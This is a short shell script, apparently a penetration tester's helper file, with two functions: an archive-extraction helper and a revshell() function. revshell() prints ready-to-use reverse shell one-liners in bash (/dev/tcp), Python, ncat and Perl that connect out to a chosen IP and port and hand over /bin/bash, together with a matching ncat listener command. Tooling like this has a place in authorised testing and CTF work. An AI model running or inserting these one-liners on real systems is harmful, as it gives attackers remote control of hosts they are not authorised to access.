extract() {
  case "$1" in
    *.tar.gz|*.tgz) tar -xzf "$1" ;;
    *.tar.bz2)      tar -xjf "$1" ;;
    *.zip)          unzip "$1" ;;
    *.7z)           7z x "$1" ;;
    *.gz)           gunzip "$1" ;;
    *.rar)          unrar x "$1" ;;
    *)              echo "[⚠] Unknown archive: $1" ;;
  esac
}

revshell() {
  local ip="${1:-$(hostname -I | awk '{print $1}')}"
  local port="${2:-4444}"
  local V=$'\e[38;5;135m' C=$'\e[38;5;51m' Y=$'\e[38;5;220m' RS=$'\e[0m'
  echo ""
  echo "  ${V}[Reverse Shell One-Liners]${RS}  ip=${Y}${ip}${RS}  port=${Y}${port}${RS}"
  echo "  ${C}bash${RS}    bash -i >& /dev/tcp/${ip}/${port} 0>&1"
  echo "  ${C}python${RS}  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${ip}\",${port}));[os.dup2(s.fileno(),x) for x in range(3)];pty.spawn(\"/bin/bash\")'"
  echo "  ${C}nc${RS}      ncat ${ip} ${port} -e /bin/bash"
  echo "  ${C}perl${RS}    perl -e 'use Socket;\$i=\"${ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'"
  echo ""
  echo "  Listener: ${Y}ncat -lvnp ${port}${RS}"
}
